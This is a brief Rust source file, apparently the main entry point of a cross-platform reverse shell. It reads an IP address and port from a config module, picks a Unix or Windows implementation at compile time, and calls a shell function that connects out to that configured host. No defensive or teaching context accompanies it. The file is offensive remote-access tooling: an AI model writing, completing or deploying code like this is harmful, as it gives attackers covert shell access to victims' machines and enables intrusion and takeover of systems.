// Load configuration values
mod config;

// Load the appropriate operating system's implementation
#[cfg(unix)]
mod unix_rs;

#[cfg(windows)]
extern crate windows;
#[cfg(windows)]
mod windows_rs;

fn main() {
    if cfg!(target_os = "windows"){
        #[cfg(windows)]
        windows_rs::shell(config::IP, config::PORT);
    }
    else {
        #[cfg(unix)]
        unix_rs::shell(config::IP, config::PORT);
    };
}